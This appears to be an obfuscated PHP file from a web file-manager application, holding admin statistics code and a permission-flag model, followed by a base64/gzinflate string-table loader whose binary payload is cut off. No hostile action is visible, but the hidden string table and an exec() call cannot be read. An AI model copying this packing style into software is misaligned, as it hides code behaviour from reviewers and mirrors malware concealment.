listTable($¥¶øñ›‘) { $£Ç«ÚÒ = ucfirst($¥¶øñ›‘); return Model($£Ç«ÚÒ)->listData(); } public function option($ïí¡˜ĞÒ) { $¨ñ‡ñ = $_SERVER[ ÇƒŠìÀ][1846] . ucfirst($ïí¡˜ĞÒ); return $this->{$¨ñ‡ñ}(); } private function optionUser() { $¶°ƒ±â½ =& $_SERVER[ ÇƒŠìÀ]; $ÊÛî—²­ = Model($¶°ƒ±â½[569])->count($¶°ƒ±â½[1689]); $¯§ìşŠÅ = Model($¶°ƒ±â½[569])->where($¶°ƒ±â½[1847])->count($¶°ƒ±â½[1689]); $â“Ç¬ôÂ = intval($GLOBALS[$¶°ƒ±â½[6]][$¶°ƒ±â½[395]][$¶°ƒ±â½[1635]]) / 3600; $ù›øúü¸ = strtotime("\55{$â“Ç¬ôÂ}\40\150\x6f\x75\x72\x73"); $›ÚÒì‚ = strtotime(date($¶°ƒ±â½[1828])); if ($ù›øúü¸ < $›ÚÒì‚) { $ù›øúü¸ = $›ÚÒì‚; } $ë¦Üûº– = array($¶°ƒ±â½[1848] => array($¶°ƒ±â½[1049], $ù›øúü¸)); $Õ‹ŠÃ = (int) Model($¶°ƒ±â½[569])->where($ë¦Üûº–)->count($¶°ƒ±â½[1689]); if (!$Õ‹ŠÃ) { $Õ‹ŠÃ = 1; } $ë¦Üûº– = array($¶°ƒ±â½[1848] => array($¶°ƒ±â½[1049], $›ÚÒì‚)); $±üÎèÀŒ = Model($¶°ƒ±â½[569])->where($ë¦Üûº–)->count($¶°ƒ±â½[1689]); return array($¶°ƒ±â½[787] => (int) $ÊÛî—²­, $¶°ƒ±â½[1849] => (int) ($ÊÛî—²­ - $¯§ìşŠÅ), $¶°ƒ±â½[1850] => (int) $¯§ìşŠÅ, $¶°ƒ±â½[1851] => (int) $±üÎèÀŒ, $¶°ƒ±â½[1852] => $Õ‹ŠÃ); } private function optionFile() { $ô••Ñƒ‰ =& $_SERVER[ ÇƒŠìÀ]; $‹è´§­ = $this->sourceSize(); $€æÜßÚ = $‹è´§­[$ô••Ñƒ‰[78]]; $ïˆçÎ˜ì = $‹è´§­[$ô••Ñƒ‰[1821]]; $ß¨Ç”±¶ = Model($ô••Ñƒ‰[854])->where(array($ô••Ñƒ‰[455] => 0))->count($ô••Ñƒ‰[183]); $º”éÑ¦Ú = array($ô••Ñƒ‰[455] => 0, $ô••Ñƒ‰[217] => array($ô••Ñƒ‰[1049], strtotime(date($ô••Ñƒ‰[1828])))); $©€óÙÃå = Model($ô••Ñƒ‰[854])->where($º”éÑ¦Ú)->sum($ô••Ñƒ‰[78]); $ÄıâËì˜ = Model($ô••Ñƒ‰[854])->where($º”éÑ¦Ú)->count($ô••Ñƒ‰[183]); return array($ô••Ñƒ‰[792] => $€æÜßÚ, $ô••Ñƒ‰[1821] => $ïˆçÎ˜ì, $ô••Ñƒ‰[1853] => $€æÜßÚ - $ïˆçÎ˜ì, $ô••Ñƒ‰[1854] => (int) $©€óÙÃå, $ô••Ñƒ‰[794] => (int) $ß¨Ç”±¶, $ô••Ñƒ‰[1855] => (int) $ÄıâËì˜); } private function optionAccess() { $Èç‚€«ğ =& $_SERVER[ ÇƒŠìÀ]; return array($Èç‚€«ğ[787] => $this->typeLogCnt(), $Èç‚€«ğ[109] => $this->typeLogCnt($Èç‚€«ğ[109]), $Èç‚€«ğ[495] => $this->typeLogCnt($Èç‚€«ğ[495]), $Èç‚€«ğ[1856] => $this->typeLogCnt($Èç‚€«ğ[1856]), $Èç‚€«ğ[1857] => $this->typeLogCnt($Èç‚€«ğ[1857]), $Èç‚€«ğ[632] => $this->typeLogCnt($Èç‚€«ğ[12], $Èç‚€«ğ[1832])); } private function typeLogCnt($³ĞşÃ©ç = '', $§İóÀ‘ = "\x69\144") { $’›± Ë =& $_SERVER[ ÇƒŠìÀ]; $¿’œëÌÄ = array($’›± Ë[109] => array($’›± Ë[1858], $’›± Ë[1859]), $’›± Ë[495] => array($’›± Ë[1860], $’›± Ë[1861]), $’›± Ë[1856] => array($’›± Ë[1862], $’›± Ë[1863], $’›± Ë[1864]), $’›± Ë[1857] => array($’›± Ë[1865], $’›± Ë[1866]), $’›± Ë[1867] => array($’›± Ë[1868], $’›± Ë[1869], $’›± Ë[1870])); $ìŞÆ €Ï = strtotime(date($’›± Ë[1828])); $ˆÒÇÆü® = array($’›± Ë[217] => array($’›± Ë[1049], $ìŞÆ €Ï)); if ($³ĞşÃ©ç) { $ˆÒÇÆü®[$’›± Ë[33]] = array($’›± Ë[7], $¿’œëÌÄ[$³ĞşÃ©ç]); } $šªº£¨É = Model($’›± Ë[1831])->where($ˆÒÇÆü®)->count($§İóÀ‘); return (int) $šªº£¨É; } private function optionServer() { $ÉÁ§÷¼ƒ =& $_SERVER[ ÇƒŠìÀ]; $Ò¯“ é = $this->diskDriver(); $Ë«àÚ¹ƒ = KodIO::defaultDriver(); $¸Çš©ú = array($ÉÁ§÷¼ƒ[846] => $Ë«àÚ¹ƒ[$ÉÁ§÷¼ƒ[445]]); $ô«½è¬Ø = Model($ÉÁ§÷¼ƒ[514])->where($¸Çš©ú)->sum($ÉÁ§÷¼ƒ[78]); $‡Š™µ‹š = explode($ÉÁ§÷¼ƒ[53], $_SERVER[$ÉÁ§÷¼ƒ[146]]); $Á™âÓûİ = $‡Š™µ‹š[0]; $ÎÎı×©ü = $GLOBALS[$ÉÁ§÷¼ƒ[6]][$ÉÁ§÷¼ƒ[21]]; $òÆ˜ïäå = $ÎÎı×©ü[$ÉÁ§÷¼ƒ[1011]]; if ($òÆ˜ïäå == $ÉÁ§÷¼ƒ[999]) { $Ò¼£ø›ã = explode($ÉÁ§÷¼ƒ[1317], $ÎÎı×©ü[$ÉÁ§÷¼ƒ[1010]]); $òÆ˜ïäå = $Ò¼£ø›ã[0]; } if ($òÆ˜ïäå == $ÉÁ§÷¼ƒ[945] || $òÆ˜ïäå == $ÉÁ§÷¼ƒ[833]) { $û¹™®È = Model()->db()->query($ÉÁ§÷¼ƒ[1871]); $–“î‚•‹ = $û¹™®È[0] && isset($û¹™®È[0][$ÉÁ§÷¼ƒ[1578]]) ? $û¹™®È[0][$ÉÁ§÷¼ƒ[1578]] : 0; $òÆ˜ïäå = $ÉÁ§÷¼ƒ[1872] . ($–“î‚•‹ ? $ÉÁ§÷¼ƒ[8] . $–“î‚•‹ : $ÉÁ§÷¼ƒ[12]); } $©Ö¼ğı­ = $GLOBALS[$ÉÁ§÷¼ƒ[6]][$ÉÁ§÷¼ƒ[395]][$ÉÁ§÷¼ƒ[856]]; return array($ÉÁ§÷¼ƒ[1873] => $Ò¯“ é ? $Ò¯“ é[$ÉÁ§÷¼ƒ[1874]] : 0, $ÉÁ§÷¼ƒ[1875] => $Ò¯“ é ? $Ò¯“ é[$ÉÁ§÷¼ƒ[1876]] : 0, $ÉÁ§÷¼ƒ[1877] => (int) $Ë«àÚ¹ƒ[$ÉÁ§÷¼ƒ[1874]] * 1024 * 1024 * 1024, $ÉÁ§÷¼ƒ[1878] => (int) $ô«½è¬Ø, $ÉÁ§÷¼ƒ[1879] => ucfirst($Á™âÓûİ), $ÉÁ§÷¼ƒ[1880] => $ÉÁ§÷¼ƒ[1881] . PHP_VERSION, $ÉÁ§÷¼ƒ[1882] => phpBuild64() ? 64 : 32, $ÉÁ§÷¼ƒ[786] => str_replace($ÉÁ§÷¼ƒ[1165], $ÉÁ§÷¼ƒ[1027], $òÆ˜ïäå), $ÉÁ§÷¼ƒ[395] => ucfirst($©Ö¼ğı­), $ÉÁ§÷¼ƒ[32] => $_SERVER[$ÉÁ§÷¼ƒ[1883]]); } private function diskDriver() { $á°Ş¡Ä¯ =& $_SERVER[ ÇƒŠìÀ]; $”§±¥ÒÏ = $á°Ş¡Ä¯[8]; $äæáÌâ¢ = $GLOBALS[$á°Ş¡Ä¯[6]][$á°Ş¡Ä¯[1334]] == $á°Ş¡Ä¯[1335]; if ($äæáÌâ¢) { $”§±¥ÒÏ = $á°Ş¡Ä¯[1884]; if (function_exists($á°Ş¡Ä¯[1885])) { exec($á°Ş¡Ä¯[1886], $œ®ıîÛ…); $”§±¥ÒÏ = $œ®ıîÛ…[1] . $á°Ş¡Ä¯[8]; } } if (!file_exists($”§±¥ÒÏ)) { return; } $ßÆÌŞ = @disk_total_space($”§±¥ÒÏ); $ŒŸÅÛŠÇ = $ßÆÌŞ - @disk_free_space($”§±¥ÒÏ); return array($á°Ş¡Ä¯[1874] => $ßÆÌŞ, $á°Ş¡Ä¯[1876] => $ŒŸÅÛŠÇ); } public function fileChart($ÚÕ¤Øë½) { $ŸšÎã®º =& $_SERVER[ ÇƒŠìÀ]; if (isset($ÚÕ¤Øë½[$ŸšÎã®º[1689]])) { return Model($ŸšÎã®º[854])->userFileTypeProfile($ÚÕ¤Øë½[$ŸšÎã®º[1689]]); } if (isset($ÚÕ¤Øë½[$ŸšÎã®º[1887]])) { return Model($ŸšÎã®º[854])->groupFileTypeProfile($ÚÕ¤Øë½[$ŸšÎã®º[1887]]); } $½œ™£¤² = $this->sourceSize(); $ÍµËı   = array($ŸšÎã®º[182] => 0, $ŸšÎã®º[180] => 1); $™Ùöë = Model($ŸšÎã®º[854])->where($ÍµËı  )->sum($ŸšÎã®º[78]); $ÍµËı  [$ŸšÎã®º[180]] = 2; $ªñÕ§Í = Model($ŸšÎã®º[854])->where($ÍµËı  )->sum($ŸšÎã®º[78]); return array($ŸšÎã®º[792] => $½œ™£¤²[$ŸšÎã®º[78]], $ŸšÎã®º[1821] => $½œ™£¤²[$ŸšÎã®º[1821]], $ŸšÎã®º[1822] => (int) $™Ùöë, $ŸšÎã®º[1823] => (int) $ªñÕ§Í); } private function sourceSize() { $ı°œ‰š² =& $_SERVER[ ÇƒŠìÀ]; $Œ¼Öè×æ = Model($ı°œ‰š²[854])->where(array($ı°œ‰š²[455] => 0))->sum($ı°œ‰š²[78]); $Úğ§©¶ó = Model($ı°œ‰š²[514])->sum($ı°œ‰š²[78]); if ($Úğ§©¶ó > $Œ¼Öè×æ) { $Úğ§©¶ó = $Œ¼Öè×æ; } return array($ı°œ‰š²[78] => (int) $Œ¼Öè×æ, $ı°œ‰š²[1821] => (int) $Úğ§©¶ó); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $¯é ±œ =& $_SERVER[ ÇƒŠìÀ]; $Ë¿‡ƒÀ = array(array($¯é ±œ[464] => LNG($¯é ±œ[1888]), $¯é ±œ[1889] => $¯é ±œ[1890], $¯é ±œ[1891] => 1, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯é ±œ[464] => LNG($¯é ±œ[1894]), $¯é ±œ[1889] => $¯é ±œ[1895], $¯é ±œ[1891] => 2, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯é ±œ[464] => LNG($¯é ±œ[1896]), $¯é ±œ[1889] => $¯é ±œ[1897], $¯é ±œ[1891] => 3, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($¯é ±œ[464] => LNG($¯é ±œ[1898]), $¯é ±œ[1889] => $¯é ±œ[1899], $¯é ±œ[1891] => 4, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => self::AUTH_SHOW | self::AUTH_VIEW), array($¯é ±œ[464] => LNG($¯é ±œ[1900]), $¯é ±œ[1889] => $¯é ±œ[1901], $¯é ±œ[1891] => 5, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($¯é ±œ[464] => LNG($¯é ±œ[1902]), $¯é ±œ[1889] => $¯é ±œ[1903], $¯é ±œ[1891] => 6, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($¯é ±œ[464] => LNG($¯é ±œ[1904]), $¯é ±œ[1889] => $¯é ±œ[1905], $¯é ±œ[1891] => 7, $¯é ±œ[1892] => 1, $¯é ±œ[1893] => 0)); return $Ë¿‡ƒÀ; } public static function authCheck($·ë÷İ‹ç, $¸£…ÔÙï) { $ë£ê«­± =& $_SERVER[ ÇƒŠìÀ]; $·ë÷İ‹ç = intval($·ë÷İ‹ç); if (KodUser::isRoot() && $GLOBALS[$ë£ê«­±[6]][$ë£ê«­±[1906]]) { return !0; } if ($·ë÷İ‹ç <= 0) { return !1; } if (($·ë÷İ‹ç & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($·ë÷İ‹ç & $¸£…ÔÙï); } public static function authCheckShow($ËË“ß¶ù) { return self::authCheck($ËË“ß¶ù, self::AUTH_SHOW); } public static function authCheckView($Œòöˆ½) { return self::authCheck($Œòöˆ½, self::AUTH_VIEW); } public static function authCheckDownload($ÁôéåÕ) { return self::authCheck($ÁôéåÕ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ßé‹üÚ) { return self::authCheck($ßé‹üÚ, self::AUTH_UPLOAD); } public static function authCheckEdit($’ïâı) { return self::authCheck($’ïâı, self::AUTH_EDIT); } public static function authCheckRemove($É’¾ÍŞ±) { return self::authCheck($É’¾ÍŞ±, self::AUTH_REMOVE); } public static function authCheckShare($·†ü²ÊÜ) { return self::authCheck($·†ü²ÊÜ, self::AUTH_SHARE); } public static function authCheckComment($Š´‡ãÇ) { return self::authCheck($Š´‡ãÇ, self::AUTH_COMMENT); } public static function authCheckEvent($ÓşËÏë›) { return self::authCheck($ÓşËÏë›, self::AUTH_EVENT); } public static function authCheckRoot($ëí €£) { return self::authCheck($ëí €£, self::AUTH_ROOT); } public static function authCheckAction($¥’”‹­ë, $€ªØªù) { $Îè‡‡•› =& $_SERVER[ ÇƒŠìÀ]; $¨¤ù˜ÜÍ = array($Îè‡‡•›[1907] => self::AUTH_VIEW, $Îè‡‡•›[1229] => self::AUTH_DOWNLOAD, $Îè‡‡•›[109] => self::AUTH_UPLOAD, $Îè‡‡•›[1857] => self::AUTH_EDIT, $Îè‡‡•›[1856] => self::AUTH_REMOVE, $Îè‡‡•›[1867] => self::AUTH_SHARE, $Îè‡‡•›[400] => self::AUTH_COMMENT, $Îè‡‡•›[1677] => self::AUTH_EVENT, $Îè‡‡•›[1908] => self::AUTH_ROOT); if (!isset($¨¤ù˜ÜÍ[$€ªØªù])) { return; } $Éîé¾‹Ó = $¨¤ù˜ÜÍ[$€ªØªù]; $¥’”‹­ë = intval($¥’”‹­ë); if ($¥’”‹­ë <= 0) { return !1; } if (($¥’”‹­ë & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¥’”‹­ë & $Éîé¾‹Ó); } public static function authDisable($Ä™«ŒÔ“, $¹¬…¤ ¢) { if (intval($Ä™«ŒÔ“) <= 0) { return 0; } return intval($Ä™«ŒÔ“) & ~$¹¬…¤ ¢; } public $optionType = "\123\x79\163\164\x65\x6d\x2e\163\157\165\x72\143\x65\101\x75\164\150\114\151\163\x74"; public $field = array("\x6e\x61\155\x65", "\141\165\x74\x68", "\x6c\141\142\145\154", "\144\151\x73\x70\x6c\141\x79", "\163\171\x73\164\x65\155", "\x73\157\x72\164"); public function initData() { $é€œ„ÎÜ = $this->authDefault(); foreach ($é€œ„ÎÜ as $Ó’ö˜Òõ) { $this->add($Ó’ö˜Òõ); } } public function findAuth($åæ´›·Ã, $äıºõ¸ò) { $å–ŞúĞı =& $_SERVER[ ÇƒŠìÀ]; $‘«æ¢¹ˆ = parent::listData(); foreach ($‘«æ¢¹ˆ as $ØŞ„ ğ) { $·”€Õ = intval($ØŞ„ ğ[$å–ŞúĞı[457]]); if ($·”€Õ <= 0 || $ØŞ„ ğ[$å–ŞúĞı[1909]] == 0) { continue; } if (($·”€Õ & $åæ´›·Ã) != $åæ´›·Ã) { continue; } if (($·”€Õ & $äıºõ¸ò) != 0) { continue; } return $ØŞ„ ğ[$å–ŞúĞı[445]]; } return !1; } public function findAuthReadOnly() { $ú¾Ó½Õ­ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $’¦Ë®Û = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($ú¾Ó½Õ­, $’¦Ë®Û); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ù¹ıíæù =& $_SERVER[ ÇƒŠìÀ]; $ÂÛÜ™ø = parent::listData(); $âÌ…Ì¯× = !1; foreach ($ÂÛÜ™ø as $èùë´ÆŒ) { if ($èùë´ÆŒ[$Ù¹ıíæù[457]] <= 0 || $èùë´ÆŒ[$Ù¹ıíæù[1909]] == $Ù¹ıíæù[214]) { continue; } if (!$âÌ…Ì¯×) { $âÌ…Ì¯× = $èùë´ÆŒ; continue; } if ($âÌ…Ì¯×[$Ù¹ıíæù[457]] > $èùë´ÆŒ[$Ù¹ıíæù[457]]) { $âÌ…Ì¯× = $èùë´ÆŒ; } } return $âÌ…Ì¯× ? $âÌ…Ì¯×[$Ù¹ıíæù[445]] : $Ù¹ıíæù[12]; } public function listData($Ç»™ìàœ = false, $…ÒÊ‡Ì = "\163\x6f\162\164", $œÇ¤œ— = false) { return parent::listData($Ç»™ìàœ, $…ÒÊ‡Ì, $œÇ¤œ—); } public function update($—Æ­¾ì„, $Á³ïÒ»Æ) { $Ò’ï‹á  =& $_SERVER[ ÇƒŠìÀ]; $€´÷™€¯ = parent::listData($—Æ­¾ì„); $ñÑ¯ª®¦ = $this->findByName($Á³ïÒ»Æ[$Ò’ï‹á [32]]); if (!$€´÷™€¯ || $ñÑ¯ª®¦ && $ñÑ¯ª®¦[$Ò’ï‹á [445]] != $€´÷™€¯[$Ò’ï‹á [445]]) { return !1; } $this->filterAuth($Á³ïÒ»Æ[$Ò’ï‹á [457]]); return parent::update($—Æ­¾ì„, $Á³ïÒ»Æ); } public function remove($óû‘Æİı) { $ĞÒõĞò¢ = parent::listData($óû‘Æİı); if (!$ĞÒõĞò¢ || $ĞÒõĞò¢[$_SERVER[ ÇƒŠìÀ][181]]) { return !1; } return parent::remove($óû‘Æİı); } public function add($¶„âŒŞİ = array()) { $ºÒİ„ù =& $_SERVER[ ÇƒŠìÀ]; if ($this->findByName($¶„âŒŞİ[$ºÒİ„ù[32]])) { return !1; } $úÎ°«²€ = array($ºÒİ„ù[32] => $ºÒİ„ù[12], $ºÒİ„ù[457] => 1, $ºÒİ„ù[1910] => $ºÒİ„ù[1897], $ºÒİ„ù[1909] => 1, $ºÒİ„ù[181] => 0, $ºÒİ„ù[1911] => 0); $¶„âŒŞİ = array_merge($úÎ°«²€, $¶„âŒŞİ); $¶„âŒŞİ[$ºÒİ„ù[1911]] = $this->getSort(); $this->filterAuth($¶„âŒŞİ[$ºÒİ„ù[457]]); return parent::insert($¶„âŒŞİ); } private function getSort() { $Ñ—×ÍØ =& $_SERVER[ ÇƒŠìÀ]; $€ÆÁ‡ = parent::listData(); $«šˆûÛ° = array_to_keyvalue($€ÆÁ‡, $Ñ—×ÍØ[12], $Ñ—×ÍØ[1911]); return empty($«šˆûÛ°) ? 0 : max($«šˆûÛ°) + 1; } private function filterAuth(&$§Í×¦³Ô) { if (!$§Í×¦³Ô) { return; } $îÃéÃÃ· = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $Ô×©³ç® = array(); foreach ($îÃéÃÃ· as $„É„»ºº) { if ($§Í×¦³Ô & $„É„»ºº) { $Ô×©³ç®[] = $„É„»ºº; } } if (in_array(self::AUTH_ROOT, $Ô×©³ç®)) { $§Í×¦³Ô = array_sum($îÃéÃÃ·); return; } $ş“ã„‹ù = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($Ô×©³ç® as $„É„»ºº) { if (isset($ş“ã„‹ù[$„É„»ºº])) { $Ô×©³ç® = array_merge($Ô×©³ç®, $ş“ã„‹ù[$„É„»ºº]); } } $Ô×©³ç®[] = self::AUTH_SHOW; $§Í×¦³Ô = array_sum(array_unique($Ô×©³ç®)); } public function sort($Ï¨—ñşâ, $ı›«¼¾ü) { return parent::update($Ï¨—ñşâ, $ı›«¼¾ü); } } goto b»‚Î¤‘•Õ; FÊŠ‘ÇÜ¿: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\240\307\203\212\354\300", strrev('àİõí¨ù')); $_SERVER[ ÇƒŠìÀ] = explode("\174\3\174\4\174\6", gzinflate(substr("\37\213\10\0\0\0\0\0\0\23\305\175\11\170\33\325\325\50\133\241\100\51\153\131\112\13\23\223\340\45\132\154\147\167\342\30\331\226\155\21\131\162\44\71\13\266\231\214\244".base64_decode('sTSxpJE1I29JaENZCiTQQqCUUiiltKEt5FHK3gClDUvZSmkhabr89E8ClKWlKZQChQ==').strrev(''."\r".'~=-çiºÖCúğXïo-¦Ës~ç9î{ç¹î{ÜûºÀù{ï½ï¿ğÉ—s—w')."\257\77\10\375\75\204\206\117\277\354\323\7\220\177\307\137\166\151\135\135\317\374\43\146\107\76\163\305\117\157\323\176\250\335\252\135\22\15\77\371\124\350\250\147\176\174\166\160\337"."\xcd\x4f\x4e\xee\x3b\xf0\x80\x37\xba\xea\xfe\xd3\x82\xa\xd3\xba\x2d\xf4\x47\x29\x98\xb6\xa2\x4f\x18\x96\x6d\xd1\x84\x94\x59\x18\x36\x32\x34\x6c\x14\xe8\xaf\x9f\xfe\xf4\xc7\xc2\x25\x3d\x6f\xda\x3a"."\215\372\350\217\12\375\42\177\255\321\234\301\362\325\110\64\241\306\373\373\372\202\261\4\24\152\221\363\363\146\32\102\105\255\244\345\341\373\105\275\144\241\336\310\315\251\105\263\250".strrev('«÷‰xÄ¼ëÈÂvJÖÜ`‘$Òõ–©"P‚û«V®Ø3µvÎ¥ ³RZÙ­!")')."\75\330\35\212\50\211\130\40\22\17\164\44\102\321\10\115\356\210\366\366\206\22\225\351\261\150\70\334\36\350\130\126\231\323\27\13\164\367\6\24\324\277\234\256\32\205\141\263\116".base64_decode('WUNz1ij1NNBl6Lk0DRY01h17sgihBA+haSqUczkaifBQWh/WyjmAVqccKZaMvMYGvQ==')."\114\237\344\251\64\240\225\155\323\50\244\150\44\70\141\227\64\221\216\372\232\102\23\255\27\240\251\170\60\34\354\110\50\270\203\112\127\54\332\253\300\44\344\65\313\326\113\312\312"."\236\140\54\250\340\116\267\326\222\261\326\52\200\57\21\4\12\45\20\16\53\323\265\140\353\371\42\153\206\326\251\322\130\64\326\31\214\51\355\253\25\1\241\224\231\317\233\5\37"."\152\5\315\244\55\165\65\30\213\321\200\7\320\73\34\302\223\6\221\150\127\127\74\310\143\60\270\345\141\324\223\71\200\237\216\130\172\70\147\253\143\132\256\314\320\164\204\376\326"."\302\17\374\232\26\240\356\250\121\60\312\200\246\320\204\151\362\145\5\201\62\53\255\263\24\75\15\201\74\252\157\102\275\44\244\45\131\51\3\55\314\61\32\154\135\112\177\27\103"."\265\244\212\363\364\222\255\352\205\224\231\66\12\260\174\333\0\15\65\73\333\131\62\120\1\32\37\66\163\151\26\266\214\51\30\334\260\221\323\43\345\274\134\204\107\123\131\43\227"."\x2e\xb1\x15\xf7\x71\x25\x69\x34\xcc\x17\x30\x2e\x2b\x62\x45\xd4\x13\xbe\xf6\x8d\xe1\x49\xb1\x2\x71\xb9\x3e\x9e\x6b\x99\xe5\x52\x4a\xf\xa1\x15\x43\xe3\x4d\x90\xac\xdb\x36\x1a\x1c\x3\x88\xd9\x5f"."\xcc\x99\x5a\x3a\xae\x97\xf8\xd0\xc\xb3\xb\x35\x14\x2d\xdb\x72\x62\x99\x14\xeb\x32\x4b\xf9\x4e\x44\x2b\xe0\xfb\x68\x9d\x18\xfd\x55\x32\x46\xd8\x4a\x49\x4b\x10\xf3\xd7\xd\x6c\xf4\x7e\x38\x34\x70"."\x16\xfa\x53\xf\xc4\x70\x10\xfa\x94\xd5\x73\x39\x55\x9f\xd0\x61\x29\xe5\xd3\xf3\x2c\x6\xc\xbf\x95\x34\xa\x7e\x94\x42\xa3\xa1\xa8\x9a\xd5\xac\x6c\x6f\x7a\x9e\x4a\x6a\x31\x1a\x9b\xd6\x27\x7c\xc5"."\154\21\326\71\137\332\203\16\124\307\240\213\230\166\120\242\324\71\63\245\345\344\41\322\160\326\266\213\161\275\220\306\220\200\241\230\343\5\2\251\242\256\103\241\116\217\222\126\172".base64_decode('ldVKT4vRYrGK+RwPsdHxNIsn2hNsOtPDgKRso6iBDxoWoXliwWrFYs5IabZhFvxmyg==')."\xd6\x6d\xaf\x65\x97\x74\xd\x5a\xc\xa4\x52\xba\x65\x79\x3b\xcc\x82\x5d\x32\x73\xde\x40\x2e\x67\x8e\x7b\xa3\x25\x23\x63\x14\x5a\x94\x6\x20\xbf\x28\x13\x2d\x73\x2f\x26\x89\x2d\xb0\x76\x6b\x16\x2b".base64_decode('GHHwZxpay/awdyFbk7x0SStYw3rJG4SV0aKgznK6yIp1GlbRtAzcvRZFs20tlcU0RQ==')."\64\337\372\61\345\215\102\316\50\350\25\145\203\23\105\243\244\133\254\257\112\167\157\2\32\101\255\353\336\276\222\226\311\153\55\112\261\234\104\220\201\225\132\45\215\226\6\320\264"."\50\51\34\365\50\371\262\145\173\113\72\42\116\6\332\0\1\310\241\141\157\57\136\127\206\236\366\306\21\15\207\344\71\215\163\25\204\72\12\313\243\251\75\211\104\237\32\352\102"."\x9b\x74\x24\xa8\xf6\x6\x12\x1d\x3d\xd0\x6d\x5b\xcb\xb0\x3e\x87\x11\x65\xe6\x4d\xb2\xc4\x55\x5e\xb4\xbe\x30\x72\x45\xd0\x58\x45\x62\x9f\x39\xae\x97\xd0\x87\xdb\x27\x5b\x94\x11\x33\x9d\x34\x27\x7c"."\54\13\27\216\43\102\303\12\343\351\56\332\336\230\126\310\140\370\44\47\155\335\162\223\252\166\264\245\373\206\351\142\366\45\365\141\263\4\243\261\306\62\316\271\10\353\205\214\235"."\145\155\307\203\261\25\301\230\32\217\166\45\126\6\142\300\1\24\20\42\115\260\336\340\257\347\274\61\75\215\146\47\145\263\172\132\21\3\226\225\301\353\7\177\234\345\342\65\305"."\362\302\241\156\14\273\116\257\205\12\171\345\122\254\355\260\221\67\360\360\154\236\103\200\215\330\203\156\350\220\237\214\271\165\320\152\250\33\114\317\256\367\242\277\15\365\3\203\235"."\xbe\x86\xa1\x36\xbf\x21\xea\xf8\x9b\x7c\x4d\x4a\x73\xe3\x7c\xa5\xf\xf1\x2b\x86\x96\x53\x60\xd0\x15\x25\x1a\x95\xe8\x32\x27\x58\x4\xc2\x17\xcc\x82\xfe\x31\xc0\xc1\x1b\x9e\x44\x19\x5c\x60\xa5\x89"."\xb1\xe0\xf2\xfe\x60\x3c\xa1\xf6\x6\x13\x3d\xd1\x4e\xf8\x7a\x30\x0\xa1\xb0\x49\x57\x36\x1b\xed\x0\xfd\x19\x2\x4\x18\xa2\x3f\xaa\x61\x75\x49\x3b\xf\x8e\x72\xa\xa5\x9a\xc9\xb5\x68\x32\x7a\x75".base64_decode('RoZh5kN5LSPtA6pzm8AxnNkrkANh2UojzfcRFO3RjUwWAGbg5lJmzixpOUw92cLRGQ==').base64_decode('RcsYQNGKuTLCGT/+QiJbzieB6CO2MaPbgiuzJhHrkmebG9oh7VCnYwuDmF/F8zzoKw==')."\x16\x32\xf5\x33\xa1\x2d\xb5\x79\x5e\x23\x4e\x0\x14\x85\x21\x22\xf6\xb4\xac\x57\xc2\xc0\x97\x32\xd1\xa2\xe8\xd5\x46\xf4\x16\x3c\x28\x20\x31\x8b\x49\x2a\x8b\x48\xb4\x67\x31\xde\x2e\x5a\xdd\x6b\xa"."\xcf\x53\xce\x97\x47\x8d\x90\x36\x3b\x4c\xbe\xc1\xd1\x3\xc0\x62\xe7\x76\xa1\xe8\xa5\x92\x59\x9a\x1\x25\x48\x58\x21\x7b\xe\x9e\x37\x68\xdc\xe